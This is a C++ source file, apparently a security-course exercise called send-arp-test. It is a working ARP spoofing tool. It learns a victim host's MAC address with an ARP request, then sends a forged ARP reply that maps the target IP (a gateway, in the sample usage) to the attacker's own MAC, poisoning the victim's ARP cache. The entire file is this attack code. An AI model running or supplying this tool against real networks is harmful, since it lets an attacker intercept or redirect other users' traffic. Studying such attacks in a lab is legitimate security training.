#include <cstdio>
#include <pcap.h>
#include <stdint.h>
#include <libnet.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "get_myinfo.h"
#include "transceive_arp.h"

void usage() {
    printf("syntax: send-arp-test <interface> <sender ip> <target ip>\n");
    printf("sample: send-arp-test eth0 192.168.50.94 192.168.50.1\n");
}


const char* mac(uint8_t* macAddr)
{
    static char buffer[18];
    sprintf(buffer,"%02x:%02x:%02x:%02x:%02x:%02x",macAddr[0],macAddr[1],macAddr[2],macAddr[3],macAddr[4],macAddr[5]);
    return buffer;
}


int main(int argc, char* argv[]) {
    if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    EthArpPacket packet;
    char self_mac[18] = "";
    char* pMAC;
    pMAC = self_mac;
    uint8_t* target_mac;

    getMacAddress(pMAC,argv[1]);

    packet = arpRequest(packet,argv[3],argv[2],pMAC);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}


    handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        return -1;
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        struct libnet_ethernet_hdr* ethHeader = (struct libnet_ethernet_hdr*)packet;
        struct libnet_arp_hdr* arpHeader = (struct libnet_arp_hdr*)(packet + sizeof(struct libnet_ethernet_hdr));
        if(htons(ethHeader->ether_type)==2054 && htons(arpHeader->ar_op)==2){
            target_mac = ethHeader->ether_shost;
            break;
        }
    }
    packet = arpReply(packet,argv[2], argv[3], pMAC, target_mac);

    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

	pcap_close(handle);
}
